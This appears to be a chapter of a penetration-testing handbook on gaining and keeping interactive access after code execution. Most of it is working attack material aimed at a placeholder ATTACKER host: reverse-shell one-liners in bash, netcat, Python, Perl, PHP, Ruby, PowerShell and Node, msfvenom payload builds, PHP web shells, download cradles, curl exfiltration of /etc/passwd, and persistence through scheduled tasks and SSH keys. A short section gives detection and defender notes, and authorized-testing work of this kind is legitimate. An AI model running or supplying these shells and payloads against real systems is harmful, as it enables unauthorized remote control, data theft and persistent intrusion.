---
title: "05_Reverse_Shells_Stabilisation_and_Tools"
---

# Reverse Shells, Stabilisation, and Tools

> **Privilege Escalation Handbook** — File 05  
> Reliable interactive access after initial code execution  
> Authorized engagements only

---

## Table of Contents

1. [Bind vs Reverse Shells](#1-bind-vs-reverse-shells)
2. [Netcat Family](#2-netcat-family)
3. [Socat](#3-socat)
4. [Metasploit multi/handler & Meterpreter](#4-metasploit-multihandler--meterpreter)
5. [msfvenom Payloads & Encoding](#5-msfvenom-payloads--encoding)
6. [Language-Based Shells](#6-language-based-shells)
7. [Web Shells](#7-web-shells)
8. [Shell Stabilisation](#8-shell-stabilisation)
9. [Encrypted & Obfuscated Channels](#9-encrypted--obfuscated-channels)
10. [File Transfer Methods](#10-file-transfer-methods)
11. [Persistence of Access (High Level)](#11-persistence-of-access-high-level)
12. [Troubleshooting](#12-troubleshooting)
13. [OPSEC & Detection Notes](#13-opsec--detection-notes)
14. [References](#14-references)

---

## 1. Bind vs Reverse Shells

### 1.1 Definitions

| Type | Direction | Typical use |
|------|-----------|-------------|
| **Reverse** | Target connects **out** to attacker | Bypasses inbound firewall NAT |
| **Bind** | Target **listens**; attacker connects in | Useful if egress filtered but inbound open |
| **Web shell** | HTTP(S) command channel | When only web port allowed |
| **C2 framework** | Beaconing / tasking | Red team long-haul |

### 1.2 Choosing

```text
Can target reach attacker IP:port? → Reverse shell (default)
Only inbound to target open? → Bind shell
Only 80/443? → HTTPS reverse / web shell / C2
Need encrypted? → socat OPENSSL, TLS C2, SSH
```

### 1.3 Listener First Rule

Always start the **listener before** triggering the payload (except some bind cases).

---

## 2. Netcat Family

### 2.1 Traditional nc

**Attacker listener:**

```bash
nc -lvnp 443
```

**Target reverse (examples):**

```bash
# If -e available (not on all builds)
nc ATTACKER 443 -e /bin/bash
nc ATTACKER 443 -e cmd.exe
```

Many modern `nc` builds lack `-e`. Use FIFO or language shells instead.

### 2.2 mkfifo Trick (no -e)

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER 443 > /tmp/f
```

### 2.3 ncat (Nmap)

```bash
# Listener with SSL
ncat -lvnp 443 --ssl
# Reverse
ncat --ssl ATTACKER 443 -e /bin/bash
```

### 2.4 BusyBox nc

IoT/embedded often ship BusyBox; syntax may differ (`nc -l -p 443`).

### 2.5 Windows nc

Ship tested binary; Windows Defender often flags. Prefer PowerShell remotes when possible.

> **Pro tip:** Use high common ports (443, 53, 80) only if they match allowed egress; random high ports can be quieter or louder depending on environment.

---

## 3. Socat

### 3.1 Basic Reverse

**Attacker:**

```bash
socat TCP-LISTEN:443,fork,reuseaddr -
```

**Target:**

```bash
socat TCP:ATTACKER:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

### 3.2 Bind Shell

```bash
# Target
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr
# Attacker
socat - TCP:TARGET:4444
```

### 3.3 Fully Interactive PTY (Excellent Stabilisation)

**Attacker (PTY listener):**

```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:443
```

**Target:**

```bash
socat TCP:ATTACKER:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

### 3.4 SSL Encrypted

Generate certs on attacker:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 30 -out cert.pem
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork -
```

Target:

```bash
socat OPENSSL:ATTACKER:443,verify=0 EXEC:/bin/bash
```

---

## 4. Metasploit multi/handler & Meterpreter

### 4.1 multi/handler Setup

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST eth0
set LPORT 443
set ExitOnSession false
run -j
```

Linux example:

```bash
set payload linux/x64/meterpreter/reverse_tcp
```

### 4.2 Meterpreter Core Commands

```text
sysinfo
getuid
getprivs
ps
migrate <pid>
shell
upload / local path
download
hashdump          # needs privs
load kiwi         # mimikatz extension
portfwd add -l 8080 -p 80 -r 10.10.10.10
```

### 4.3 Autopwn Caution

Prefer controlled handlers over unattended exploit sprawl on production.

### 4.4 Stage vs Stageless

| Type | Pros | Cons |
|------|------|------|
| Staged | Smaller initial payload | Needs reliable second fetch |
| Stageless | Single blob | Larger; more AV surface |

```bash
# Staged
windows/x64/meterpreter/reverse_tcp
# Stageless
windows/x64/meterpreter_reverse_tcp
```

### 4.5 Detection Notes

- Classic Meterpreter is heavily signatured
- Prefer encrypted transports / modern C2 for real red teams
- Still excellent for labs and OSCP-style exams

---

## 5. msfvenom Payloads & Encoding

### 5.1 Common Payloads

```bash
# Windows reverse TCP exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o met.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o rev.elf

# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw -o shell.php

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o shell.py

# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o setup.msi
```

### 5.2 Formats

`-f` options include: `exe`, `dll`, `elf`, `raw`, `c`, `python`, `powershell`, `hta-psh`, `vba`, `msi`, `aspx`, `war`, …

### 5.3 Encoders (Limited Modern Value)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe
```

> **Warning:** Encoders alone rarely bypass modern AV/EDR. Treat as lab noise reduction at best; real evasion needs custom loaders, signing, etc. (File 08).

### 5.4 Bad Characters & Exit Func

For buffer overflow exploits:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=443 EXITFUNC=thread -b '\x00\x0a\x0d' -f python
```

### 5.5 Payload Size

```bash
msfvenom -p ... -f raw | wc -c
```

---

## 6. Language-Based Shells

### 6.1 Bash

```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1
```

Some shells lack `/dev/tcp` (not bash).

### 6.2 Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

Python 2 variant uses `python` and similar.

### 6.3 Perl

```bash
perl -e 'use Socket;$i="ATTACKER";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### 6.4 PHP

```bash
php -r '$sock=fsockopen("ATTACKER",443);exec("/bin/bash -i <&3 >&3 2>&3");'
# fd number may vary; alternative:
php -r '$s=fsockopen("ATTACKER",443);$p=proc_open("/bin/bash",[["pipe","r"],["pipe","w"],["pipe","w"]],$pipes);...'
```

### 6.5 Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",443).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### 6.6 PowerShell Reverse

```powershell
# Classic TCP client (one of many variants)
$c=New-Object Net.Sockets.TCPClient("ATTACKER",443);
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  $r=(iex $d 2>&1|Out-String);
  $r2=$r+"PS "+(pwd).Path+"> ";
  $sb=([Text.Encoding]::ASCII).GetBytes($r2);
  $s.Write($sb,0,$sb.Length)
}
```

Shorter download cradles (highly monitored):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
```

### 6.7 Nishang / PowerCat

Community PowerShell frameworks for reverse shells and helpers — signatured but useful in labs.

### 6.8 awk / lua / node

```bash
# Node
node -e 'net=require("net");sh=require("child_process").spawn("/bin/bash",[]);client=new net.Socket();client.connect(443,"ATTACKER",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
```

---

## 7. Web Shells

### 7.1 When to Use

- File upload / LFI / write to webroot
- Egress only allows HTTP(S) to internet or you need interactive via browser

### 7.2 Simple PHP

```php
<?php system($_GET["cmd"]); ?>
```

Better: POST + auth token + disable dangerous display in reports after demo.

```php
<?php
if (isset($_POST['c']) && $_POST['k']==='REDACTED_TOKEN') {
  echo "<pre>" . shell_exec($_POST['c']) . "</pre>";
}
?>
```

### 7.3 ASPX / JSP / ColdFusion

Match the application stack. msfvenom can generate aspx/war payloads.

### 7.4 Mini Web Shells vs Full Featured

| Type | Example | Notes |
|------|---------|-------|
| One-liner | `system($_GET['c'])` | Easy detect |
| China Chopper style | Small eval | Common IDS rules |
| Godzilla / AntSword | Encrypted traffic | Red team tooling |
| Official app plugins | CMS plugin | Blends in |

### 7.5 Hardening Note for Reports

Recommend removing write access to webroot, disabling dangerous functions, WAF rules, and file integrity monitoring.

---

## 8. Shell Stabilisation

Unstable shells break on `Ctrl-C`, lack job control, and ruin editors. Stabilise early.

### 8.1 Python PTY

On target:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then on attacker:

```bash
# Background with Ctrl-Z
stty raw -echo; fg
# Press Enter
reset
export TERM=xterm-256color
stty rows 40 columns 120
```

### 8.2 script Method

```bash
script /dev/null -c bash
```

### 8.3 rlwrap

```bash
rlwrap nc -lvnp 443
```

Gives history/arrow keys on raw nc — still not full PTY.

### 8.4 socat Full PTY

See section 3.3 — often best Linux stabilisation.

### 8.5 Expect / screen / tmux

```bash
# On target if available
tmux
screen
```

Useful for keeping long tasks alive if reverse shell drops.

### 8.6 Windows Stabilisation

- Prefer PowerShell or Meterpreter over raw `cmd` nc
- `conpty` based shells (modern C2) for interactive console
- `stty` tricks are Linux-specific

### 8.7 Fix Broken Terminals

```bash
export TERM=xterm
export SHELL=/bin/bash
stty sane
```

---

## 9. Encrypted & Obfuscated Channels

### 9.1 SSH Reverse Tunnel

If you can SSH out or have creds:

```bash
# From target: expose local 3389 to attacker localhost
ssh -R 3389:127.0.0.1:3389 user@ATTACKER
```

### 9.2 socat OPENSSL

Covered in §3.4.

### 9.3 TLS Meterpreter / HTTPS Payloads

```bash
set payload windows/x64/meterpreter/reverse_https
set LHOST ...
set LPORT 443
```

### 9.4 DNS / ICMP Tunnels

Slow; used when only DNS egress exists (e.g., dnscat2, iodine). High novelty detection in mature SOCs.

### 9.5 C2 Frameworks (Overview)

Cobalt Strike, Sliver, Havoc, Mythic — encrypted beacons, malleable profiles, domain fronting (where still applicable). Out of scope for deep coverage here; choose based on team doctrine.

---

## 10. File Transfer Methods

### 10.1 Classic Linux

```bash
# Attacker
python3 -m http.server 80
# Target
wget http://ATTACKER/linpeas.sh
curl -O http://ATTACKER/tool.bin
```

```bash
# Base64 paste when no egress download
base64 tool.bin > tool.b64
# paste on target
base64 -d tool.b64 > tool.bin
chmod +x tool.bin
```

### 10.2 Netcat File Transfer

```bash
# Receiver
nc -lvnp 9001 > file.bin
# Sender
nc TARGET 9001 < file.bin
```

### 10.3 Windows

```powershell
certutil -urlcache -f http://ATTACKER/enum.exe C:\Temp\enum.exe
bitsadmin /transfer n http://ATTACKER/a.exe C:\Temp\a.exe
iwr http://ATTACKER/a.exe -OutFile C:\Temp\a.exe
```

```cmd
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/a.exe','C:\Temp\a.exe')"
```

### 10.4 SMB

```bash
# Attacker
impacket-smbserver share . -smb2support
# Target
copy \\ATTACKER\share\tool.exe C:\Temp\
```

### 10.5 Upload From Target (Exfil)

```bash
curl -F "file=@/etc/passwd" http://ATTACKER/upload
# or nc
```

### 10.6 Meterpreter

```text
upload local remote
download remote local
```

> **Pro tip:** Prefer HTTPS and signed internal package repos in enterprise red teams; raw HTTP + certutil is lab-friendly but noisy.

---

## 11. Persistence of Access (High Level)

Only if **in scope**. Prefer least noisy, fully documented for cleanup.

### 11.1 Linux (Examples)

| Method | Notes |
|--------|-------|
| SSH authorized_keys | Simple; easy to find |
| Cron / systemd user service | Survives reboot |
| New privileged user | Loud |
| Web shell left behind | Common in pentests if agreed |

```bash
# authorized_keys example
mkdir -p ~/.ssh
echo 'ssh-ed25519 AAAA... ro@ops' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
```

### 11.2 Windows (Examples)

| Method | Notes |
|--------|-------|
| Scheduled task | Common |
| Service | Needs admin |
| Registry Run key | User or HKLM |
| WMI event subscription | Stealthier; File 08 |
| Startup folder | Simple |

```cmd
schtasks /create /sc onlogon /tn "Updater" /tr "C:\Temp\beacon.exe" /ru SYSTEM
```

### 11.3 Cleanup Discipline

Track every persistence artifact in a cleanup checklist; remove at engagement end unless client requests otherwise.

---

## 12. Troubleshooting

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| No connect | Listener down / wrong IP | Verify LHOST as seen by target |
| No connect | Egress filtered | Try 443/53/80; HTTP shell |
| Connect then die | AppArmor/SELinux/AV | Different payload path |
| Garbled shell | No PTY | Python pty / socat |
| Ctrl-C kills shell | Raw nc | Stabilise; use socat |
| Windows payload fails | Arch mismatch | x86 vs x64 |
| Staged meterpreter fail | Staging blocked | Stageless or raw shell |
| `bash: /dev/tcp` fail | Not bash | python/nc fifo |

### 12.1 Verify Egress

```bash
# On target
curl -v http://ATTACKER/
nc -zv ATTACKER 443
```

### 12.2 Catch-All Debug Listener

```bash
tcpdump -ni eth0 port 443
# Confirm SYN arrives
```

---

## 13. OPSEC & Detection Notes

| Activity | Detection ideas |
|----------|-----------------|
| nc reverse | Process lineage + network to rare IP |
| PowerShell IEX | Script block logging, AMSI |
| certutil download | LOLBAS telemetry |
| Meterpreter | Well-known C2 patterns / hooks |
| Web shells | Web logs, FIM on webroot |
| Persistent tasks | Persistence hunting (Autoruns, EDR) |

Defender recommendations for reports:

- Egress filtering and proxy allow-lists  
- Disable dangerous scripting where possible  
- Webroot integrity monitoring  
- Restrict outbound from servers  

---

## 14. References

- [PayloadsAllTheThings — Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [HackTricks — Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [msfvenom docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/) Command and Scripting Interpreter  
- [MITRE ATT&CK T1071](https://attack.mitre.org/techniques/T1071/) Application Layer Protocol  
- [revshells.com](https://www.revshells.com/) — generator (verify before use)

---

## Appendix A: Quick Cheatsheet

```bash
# Listener
nc -lvnp 443
rlwrap nc -lvnp 443
socat file:`tty`,raw,echo=0 TCP-LISTEN:443

# Bash reverse
bash -i >& /dev/tcp/LHOST/443 0>&1

# Python pty upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z → stty raw -echo; fg → reset → export TERM=xterm
```

## Appendix B: Windows One-Liner Caution

Long PowerShell reverse shells in command lines are logged. Prefer file-based or C2 for stealth engagements; one-liners for CTF/lab speed.

## Appendix C: Exam vs Red Team

| Context | Prefer |
|---------|--------|
| OSCP-like | nc, bash, python, simple msf |
| Enterprise RT | Encrypted C2, least privilege payloads, OPSEC |
| Web app pentest | Minimal web shell + time-boxed |

---

*End of File 05 — Reverse Shells, Stabilisation, and Tools*  
*Next: `06_Modern_Cloud_and_Container_Privilege_Escalation.md`*
